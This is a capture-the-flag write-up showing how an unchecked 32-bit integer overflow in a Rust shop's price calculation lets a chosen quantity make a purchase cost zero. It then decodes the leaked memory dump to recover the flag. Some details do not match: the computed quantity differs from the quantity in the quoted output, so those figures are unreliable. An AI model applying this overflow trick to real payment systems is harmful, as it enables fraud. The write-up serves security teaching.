# Cor.Shop
## Introduction
We get the following:
* nc ctfi.ng 31417

## Vulnerability
When running `nc ctfi.ng 31417` we find ourselves inside a shop-layout. We get a list of commands which show items, our balance, prices of items, and a way to buy them. The source code for the site is up for free so we buy it [Source-Code](cor.shop's-source-code.rs). 
The first thing i notice in the code is that there is no flag mentioned. So, the item `Day's Heap` is my best guess as to where the flag is stored. 

Since we have the entire source-code we can start to look for possible vulnerabilities. Our goal is to either get a balance of `600,000`, or circumventing the need to pay entirely.

```rust
let total: u64 = (item.price as u32 * qty) as u64;
```

Here the u64 price is truncated to u32 so the multiplcation can be performed in 32 bits. This multiplication wraps `modulo 2^32`. This means we can choose a quantity(`qty`) that wraps to a small or -even better- zero value. Thus we end up bypassing the later check of `balance >= total`.

### Exploitation
First we note the price of `Day's Heap` the which is `600,000` and compute the smallest positive value for `qty`.

```python
import math
p = 600000
qty = 2**32 / math.gcd(p, 2**32)
print(qty) # 67108864.0
```
From here we can use this value as our `qty` and buy `Day's Heap`, which returns:

```python
> Purchased 268435456 x Day's Heap for 0 corns.
0x804b000:      0x00000000      0x00000069      0x63726f63      0x737b6674
0x804b010:      0x72707275      0x5f337331      0x5f737431      0x70617277
0x804b020:      0x5f643370      0x5f646e34      0x33337266      0x0000007d
0x804b030:      0x00000000      0x00000000      0x00000000      0x00000000
0x804b040:      0x00000000      0x00000000      0x00000000      0x00000000
0x804b050:      0x00000000      0x00000000      0x00000000      0x00000000
0x804b060:      0x00000000      0x00000000      0x00000068      0x00000069
0x804b070:      0x00000000      0x00000000      0x00000000      0x00000000
0x804b080:      0x00000000      0x00000000      0x00000000      0x00000000
0x804b090:      0x00000000      0x00000000      0x00000000      0x00000000
0x804b0a0:      0x00000000      0x00000000      0x00000000      0x00000000
0x804b0b0:      0x00000000      0x00000000      0x00000000      0x00000000
0x804b0c0:      0x00000000      0x00000000      0x00000000      0x00000000
0x804b0d0:      0x00000000      0x00020f31      0x00000000      0x00000000
0x804b0e0:      0x00000000      0x00000000      0x00000000      0x00000000
```

Next up we want to try and [parse the dump](parse-dump.py) as readable ASCII. This is done by dividing it by hexidecimal values while skipping the memory reference values.

```python
hex_values = []
for line in dump.splitlines():
    parts = line.split()
    for p in parts[1:]:
        if p.startswith("0x"):
            hex_values.append(p)
```

From here we can convert each hexidecimal value in `hex_values` to bytes, join them, and convert those to ASCII.

```python
b = b''.join(int(v, 16).to_bytes(4, 'little') for v in hex_values)

flag = b.decode('ascii', errors='ignore').strip('\x00')
print(flag) # icorctf{surpr1s3_1ts_wrapp3d_4nd_fr33}hi1☼☻
```

Following the formatting given for the flags:

```
corctf{surpr1s3_1ts_wrapp3d_4nd_fr33}
```

